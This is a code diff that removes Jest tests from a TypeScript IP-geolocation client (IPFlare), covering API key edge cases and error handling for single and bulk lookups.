-        // Validation should be fast even for 500 IPs
-        expect(endTime - startTime).toBeLessThan(100);
-      });
-    });
-
-    describe("API Key Validation", () => {
-      it("should handle very long API keys", () => {
-        const longApiKey = "a".repeat(1000);
-        expect(() => new IPFlare({ apiKey: longApiKey })).not.toThrow();
-      });
-
-      it("should handle API keys with special characters", () => {
-        const specialApiKey = "test-key_123!@#$%^&*()";
-        expect(() => new IPFlare({ apiKey: specialApiKey })).not.toThrow();
-      });
-
-      it("should handle API keys with unicode characters", () => {
-        const unicodeApiKey = "test-key-🔑-测试";
-        expect(() => new IPFlare({ apiKey: unicodeApiKey })).not.toThrow();
-      });
-    });
-  });
-
-  describe("Error handling edge cases", () => {
-    it("should throw generic error for non-axios errors in lookup", async () => {
-      // Mock a non-axios error
-      const mockError = new Error("Some unexpected error");
-      jest.spyOn(geolocator["client"], "get").mockRejectedValueOnce(mockError);
-
-      await expect(geolocator.lookup("8.8.8.8")).rejects.toThrow(
-        "Failed to fetch geolocation data"
-      );
-    });
-
-    it("should throw generic error for non-Error, non-axios errors in bulkLookup", async () => {
-      // Mock a non-Error, non-axios error (like a string or object)
-      const mockError = "Some unexpected non-Error exception";
-      jest.spyOn(geolocator["client"], "post").mockRejectedValueOnce(mockError);
-
-      await expect(geolocator.bulkLookup({ ips: ["8.8.8.8"] })).rejects.toThrow(
-        "Failed to fetch bulk geolocation data"
-      );
-    });
-
-    it("should handle axios error without response in lookup", async () => {
-      // Mock axios error without response
-      const axiosError = Object.assign(new Error("Network error"), {
-        isAxiosError: true,
-        response: undefined,
-      });
-
-      jest.spyOn(geolocator["client"], "get").mockRejectedValueOnce(axiosError);
-
-      await expect(geolocator.lookup("8.8.8.8")).rejects.toThrow(
-        "Failed to fetch geolocation data"
-      );
-    });
-
-    it("should handle axios error without response in bulkLookup", async () => {
-      // Mock axios error without response - this should re-throw the original error
-      const axiosError = Object.assign(new Error("Network error"), {
-        isAxiosError: true,
-        response: undefined,
-      });
-
-      jest
-        .spyOn(geolocator["client"], "post")
-        .mockRejectedValueOnce(axiosError);
-
-      await expect(geolocator.bulkLookup({ ips: ["8.8.8.8"] })).rejects.toThrow(
-        "Network error"
-      );
-    });
-
-    it("should handle axios error with unknown status code in bulkLookup", async () => {
-      // Mock axios error with unknown status code - this should re-throw the original error
-      const axiosError = Object.assign(new Error("Server error"), {
-        isAxiosError: true,
-        response: {
-          status: 503,
-          data: { message: "Service unavailable" },
-        },
-      });
-
-      jest
-        .spyOn(geolocator["client"], "post")
-        .mockRejectedValueOnce(axiosError);
-
-      await expect(geolocator.bulkLookup({ ips: ["8.8.8.8"] })).rejects.toThrow(
-        "Server error"
-      );
-    });
-
-    it("should re-throw Error instances in bulkLookup", async () => {
-      // Mock a custom Error instance
-      const customError = new Error("Custom validation error");
-      jest
-        .spyOn(geolocator["client"], "post")
-        .mockRejectedValueOnce(customError);
-
-      await expect(geolocator.bulkLookup({ ips: ["8.8.8.8"] })).rejects.toThrow(
-        "Custom validation error"
-      );
     });
   });
 });
